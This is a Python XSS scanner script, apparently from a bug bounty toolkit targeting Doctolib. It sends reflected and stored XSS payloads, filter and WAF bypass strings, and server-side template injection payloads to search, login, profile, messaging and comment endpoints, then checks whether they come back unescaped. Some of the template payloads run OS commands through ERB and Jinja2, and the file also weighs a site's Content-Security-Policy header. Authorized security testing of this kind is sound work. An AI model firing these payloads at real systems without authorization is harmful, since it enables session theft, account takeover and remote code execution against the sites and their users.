#!/usr/bin/env python3
"""XSS Scanner (Reflected + Stored + CSP Analysis) — CWE-79.

Comprehensive XSS testing combining:
  1. Reflected XSS — search, URL params, error pages (12+ payloads)
  2. Stored XSS — profile fields, messaging, comments (5 payloads)
  3. Template injection — Rails ERB, Angular, Jinja2, Pug
  4. CSP header analysis — missing/weak directives
  5. DOM-based via parameter reflection detection

Source: doctolib_xss_scan.py from Doctolib bug bounty campaign.

Usage:
    python xss_scanner.py --target https://example.com --dry-run
    python xss_scanner.py --target https://example.com --config /configs/xss-config.yaml

⚠️ Contenu généré par IA — validation humaine requise avant utilisation.
"""

from __future__ import annotations

import sys
from urllib.parse import quote

from lib import (
    Finding,
    RateLimitedSession,
    get_session_from_env,
    load_config,
    log,
    parse_base_args,
    save_findings,
)

# ---------------------------------------------------------------------------
# Reflected XSS Payloads
# ---------------------------------------------------------------------------

REFLECTED_PAYLOADS = [
    # Basic
    {"name": "script-alert", "payload": '<script>alert(document.domain)</script>'},
    {"name": "img-onerror", "payload": '<img src=x onerror=alert(document.domain)>'},
    {"name": "svg-onload", "payload": '<svg onload=alert(document.domain)>'},

    # Attribute breaking
    {"name": "dblquote-event", "payload": '"><img src=x onerror=alert(1)>'},
    {"name": "singlequote-event", "payload": "'><img src=x onerror=alert(1)>"},

    # Template injection (serious — RCE potential)
    {"name": "erb-inject", "payload": "<%= system('id') %>"},
    {"name": "angular-inject", "payload": "{{constructor.constructor('alert(1)')()}}"},
    {"name": "jinja2-inject", "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
    {"name": "pug-inject", "payload": "#{7*7}"},

    # Encoding bypass
    {"name": "unicode-lt", "payload": "\u003cscript\u003ealert(1)\u003c/script\u003e"},
    {"name": "html-entity", "payload": "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"},

    # Event handlers (no brackets)
    {"name": "body-onload", "payload": '" onfocus=alert(1) autofocus="'},
    {"name": "details-open", "payload": '<details open ontoggle=alert(1)>'},

    # Polyglot
    {"name": "polyglot", "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//"},

    # Exotic — WAF bypass
    {"name": "svg-animate", "payload": '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'},
    {"name": "math-xlink", "payload": '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">'},
    {"name": "data-uri", "payload": '<object data="data:text/html,<script>alert(1)</script>">'},
]

# ---------------------------------------------------------------------------
# Stored XSS Payloads (conservative for safety)
# ---------------------------------------------------------------------------

STORED_PAYLOADS = [
    {"name": "img-src-short", "payload": '<img src=x onerror=alert(document.domain)>'},
    {"name": "a-href-js", "payload": '<a href="javascript:alert(1)">click</a>'},
    {"name": "event-handler", "payload": '" onfocus="alert(document.domain)" autofocus="'},
    {"name": "svg-minimal", "payload": '<svg/onload=alert(1)>'},
    {"name": "markdown-link", "payload": '[click](javascript:alert(1))'},
]

# ---------------------------------------------------------------------------
# Default targets
# ---------------------------------------------------------------------------

DEFAULT_REFLECTED_TARGETS = [
    {"path": "/search", "params": ["q", "query", "search", "term"]},
    {"path": "/api/search", "params": ["q", "query", "term", "keyword"]},
    {"path": "/api/searchbar", "params": ["q", "query", "term"]},
    {"path": "/404", "params": ["url", "path", "page"]},
    {"path": "/error", "params": ["message", "error", "msg"]},
    {"path": "/login", "params": ["redirect", "next", "return_to"]},
    {"path": "/api/autocomplete", "params": ["q", "query", "prefix"]},
]

DEFAULT_STORED_TARGETS = [
    # Profile fields
    {"path": "/api/users/me", "method": "PUT",
     "fields": ["first_name", "last_name", "bio", "address", "city", "company"]},
    {"path": "/api/profile", "method": "PUT",
     "fields": ["name", "description", "website", "location"]},

    # Messaging
    {"path": "/api/messages", "method": "POST",
     "fields": ["content", "subject", "body", "text"]},

    # Comments / notes
    {"path": "/api/comments", "method": "POST",
     "fields": ["content", "comment", "text"]},
    {"path": "/api/notes", "method": "POST",
     "fields": ["content", "note", "body"]},
]


# ---------------------------------------------------------------------------
# Scanner functions
# ---------------------------------------------------------------------------


def test_reflected_xss(
    sess: RateLimitedSession,
    base: str,
    targets: list[dict],
    dry_run: bool,
) -> list[Finding]:
    """Test reflected XSS on search and URL parameters."""
    findings: list[Finding] = []

    for target in targets:
        url = f"{base}{target['path']}"

        for param in target["params"]:
            for payload_obj in REFLECTED_PAYLOADS[:8]:  # Top 8 per param
                payload = payload_obj["payload"]

                if dry_run:
                    log.info("[dry-run] GET %s?%s=%s", target["path"], param, payload_obj["name"])
                    continue

                try:
                    r = sess.get(url, params={param: payload})
                    body = r.text

                    reflected = False
                    reflection_type = ""

                    # Exact unescaped reflection
                    if payload in body:
                        reflected = True
                        reflection_type = "exact reflection (unescaped)"
                    else:
                        # Partial reflection of dangerous constructs
                        dangerous = ["onerror=", "onload=", "onfocus=", "ontoggle=",
                                     "javascript:", "<script", "<svg", "<img"]
                        for part in dangerous:
                            if part in body.lower() and param in r.url:
                                reflected = True
                                reflection_type = f"partial reflection ({part})"
                                break

                    if reflected:
                        findings.append(Finding(
                            title=f"Reflected XSS via {param} on {target['path']}",
                            severity="medium",
                            cwe="CWE-79",
                            endpoint=url,
                            method="GET",
                            description=(
                                f"Reflected XSS via '{param}' parameter on {target['path']}. "
                                f"Payload '{payload_obj['name']}' — {reflection_type}."
                            ),
                            steps=[
                                f"Navigate to {url}?{param}={quote(payload)}",
                                f"Observe payload reflected: {reflection_type}",
                            ],
                            impact="XSS execution in victim's browser — session theft, data exfiltration.",
                            evidence={
                                "param": param,
                                "payload_name": payload_obj["name"],
                                "reflection_type": reflection_type,
                                "status": r.status_code,
                            },
                        ))
                        log.warning("⚠ Reflected XSS: %s?%s — %s",
                                    target["path"], param, payload_obj["name"])
                        break  # One per param is enough

                    log.debug("  GET %s?%s=%s → %d (not reflected)",
                              target["path"], param, payload_obj["name"], r.status_code)

                except Exception as e:
                    log.debug("  %s?%s: %s", target["path"], param, e)

    return findings


def test_stored_xss(
    sess: RateLimitedSession,
    base: str,
    targets: list[dict],
    dry_run: bool,
) -> list[Finding]:
    """Test stored XSS on profile/messaging fields."""
    findings: list[Finding] = []

    for target in targets:
        url = f"{base}{target['path']}"

        for field_name in target["fields"]:
            payload = STORED_PAYLOADS[0]  # Use safest payload

            if dry_run:
                log.info("[dry-run] %s %s {%s: <%s>}",
                         target["method"], target["path"], field_name, payload["name"])
                continue

            try:
                body = {field_name: payload["payload"]}
                if target["method"] == "PUT":
                    r = sess.put(url, json=body)
                else:
                    r = sess.post(url, json=body)

                log.info("  %s %s [%s=%s] → %d",
                         target["method"], target["path"],
                         field_name, payload["name"], r.status_code)

                # If accepted, verify storage
                if r.status_code in (200, 201):
                    # Try to read back
                    read_r = None
                    if target["method"] == "PUT":
                        read_r = sess.get(url)
                    elif "messages" in target["path"]:
                        read_r = sess.get(f"{base}/api/messages")
                    elif "comments" in target["path"]:
                        read_r = sess.get(f"{base}/api/comments")

                    if read_r and read_r.status_code == 200:
                        if payload["payload"] in read_r.text:
                            findings.append(Finding(
                                title=f"Stored XSS via {field_name} on {target['path']}",
                                severity="high",
                                cwe="CWE-79",
                                endpoint=url,
                                method=target["method"],
                                description=(
                                    f"Stored XSS via '{field_name}' field on {target['path']}. "
                                    f"Payload '{payload['name']}' stored and rendered unescaped."
                                ),
                                steps=[
                                    f"{target['method']} {url} with {field_name}=<payload>",
                                    "Payload is stored",
                                    "When any user views this data, payload executes",
                                ],
                                impact=(
                                    "Stored XSS — any user viewing this data will execute the payload. "
                                    "Can steal session cookies, exfiltrate data, or impersonate users."
                                ),
                                evidence={
                                    "field": field_name,
                                    "payload": payload["payload"],
                                    "status": r.status_code,
                                },
                            ))
                            log.warning("⚠ Stored XSS: %s field=%s",
                                        target["path"], field_name)

            except Exception as e:
                log.debug("  %s %s [%s]: %s",
                          target["method"], target["path"], field_name, e)

    return findings


def test_template_injection(
    sess: RateLimitedSession,
    base: str,
    dry_run: bool,
) -> list[Finding]:
    """Test server-side template injection (SSTI) via common inputs."""
    findings: list[Finding] = []

    ssti_payloads = [
        {"name": "math-7x7", "payload": "{{7*7}}", "expect": "49"},
        {"name": "math-7x'7'", "payload": "{{7*'7'}}", "expect": "7777777"},
        {"name": "jinja2-config", "payload": "{{config}}", "expect": "SECRET_KEY"},
        {"name": "erb-math", "payload": "<%= 7*7 %>", "expect": "49"},
    ]

    test_endpoints = [
        {"path": "/search", "param": "q"},
        {"path": "/api/search", "param": "q"},
        {"path": "/api/render", "param": "template"},
        {"path": "/api/preview", "param": "content"},
    ]

    for endpoint in test_endpoints:
        url = f"{base}{endpoint['path']}"
        for payload_obj in ssti_payloads:
            if dry_run:
                log.info("[dry-run] SSTI %s?%s=%s",
                         endpoint["path"], endpoint["param"], payload_obj["name"])
                continue

            try:
                r = sess.get(url, params={endpoint["param"]: payload_obj["payload"]})
                if payload_obj["expect"] in r.text:
                    findings.append(Finding(
                        title=f"Template injection via {endpoint['param']} on {endpoint['path']}",
                        severity="critical",
                        cwe="CWE-1336",
                        endpoint=url,
                        method="GET",
                        description=(
                            f"Server-side template injection on {endpoint['path']}. "
                            f"Payload '{payload_obj['name']}' was evaluated server-side."
                        ),
                        steps=[
                            f"GET {endpoint['path']}?{endpoint['param']}={quote(payload_obj['payload'])}",
                            f"Response contains '{payload_obj['expect']}' — template evaluated",
                        ],
                        impact="SSTI can lead to Remote Code Execution (RCE) on the server.",
                        evidence={
                            "payload": payload_obj["payload"],
                            "expected": payload_obj["expect"],
                            "status": r.status_code,
                            "response_snippet": r.text[:300],
                        },
                    ))
                    log.warning("⚠ SSTI: %s — %s", endpoint["path"], payload_obj["name"])
                    break

            except Exception as e:
                log.debug("  SSTI %s: %s", endpoint["path"], e)

    return findings


def test_csp_headers(
    sess: RateLimitedSession,
    base: str,
    dry_run: bool,
) -> list[Finding]:
    """Analyze Content-Security-Policy for weaknesses."""
    findings: list[Finding] = []

    if dry_run:
        log.info("[dry-run] Would check CSP headers on %s", base)
        return findings

    try:
        r = sess.get(base)
        csp = r.headers.get("Content-Security-Policy", "")
        csp_ro = r.headers.get("Content-Security-Policy-Report-Only", "")

        if not csp and not csp_ro:
            findings.append(Finding(
                title="Missing Content-Security-Policy Header",
                severity="low",
                cwe="CWE-693",
                endpoint=base,
                method="GET",
                description="No CSP header found — XSS payloads are not mitigated by CSP.",
                steps=["GET / — check response headers for CSP"],
                impact="No CSP means XSS payloads have no browser-level mitigation.",
            ))
        else:
            policy = csp or csp_ro
            weak_directives = []

            if "'unsafe-inline'" in policy:
                weak_directives.append("unsafe-inline (allows inline scripts)")
            if "'unsafe-eval'" in policy:
                weak_directives.append("unsafe-eval (allows eval())")
            if "data:" in policy:
                weak_directives.append("data: URI (allows data: protocol in scripts)")
            if "*" in policy.split():
                weak_directives.append("wildcard * (allows any source)")
            if "blob:" in policy:
                weak_directives.append("blob: URI (can be abused for script execution)")

            if weak_directives:
                findings.append(Finding(
                    title="Weak Content-Security-Policy",
                    severity="low",
                    cwe="CWE-693",
                    endpoint=base,
                    method="GET",
                    description=f"CSP contains weak directives: {', '.join(weak_directives)}",
                    steps=["GET / — parse CSP header"],
                    impact="Weak CSP directives may allow XSS exploitation.",
                    evidence={"csp": policy, "weak": weak_directives},
                ))
                log.warning("⚠ Weak CSP: %s", weak_directives)

        log.info("  CSP: %s", csp[:120] if csp else "(missing)")

    except Exception as e:
        log.debug("  CSP check: %s", e)

    return findings


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main() -> None:
    parser = parse_base_args()
    args = parser.parse_args()

    if args.verbose:
        log.setLevel("DEBUG")

    config = load_config(args.config)
    sess = get_session_from_env()
    base = args.target.rstrip("/")

    # Config overrides
    reflected_targets = config.get("reflected_targets") or DEFAULT_REFLECTED_TARGETS
    stored_targets = config.get("stored_targets") or DEFAULT_STORED_TARGETS

    findings: list[Finding] = []

    log.info("=" * 60)
    log.info("XSS Scanner (Reflected + Stored + SSTI + CSP)")
    log.info("Target: %s | Dry-run: %s", base, args.dry_run)
    log.info("=" * 60)

    # Phase 1: Reflected XSS
    log.info("[phase 1] Testing reflected XSS (%d targets)...", len(reflected_targets))
    findings.extend(test_reflected_xss(sess, base, reflected_targets, args.dry_run))

    # Phase 2: Stored XSS
    log.info("[phase 2] Testing stored XSS (%d targets)...", len(stored_targets))
    findings.extend(test_stored_xss(sess, base, stored_targets, args.dry_run))

    # Phase 3: Template injection
    log.info("[phase 3] Testing template injection...")
    findings.extend(test_template_injection(sess, base, args.dry_run))

    # Phase 4: CSP analysis
    log.info("[phase 4] Checking CSP headers...")
    findings.extend(test_csp_headers(sess, base, args.dry_run))

    log.info("=" * 60)
    log.info("Results: %d findings", len(findings))
    if findings and not args.dry_run:
        save_findings(findings, "xss-scanner")


if __name__ == "__main__":
    main()
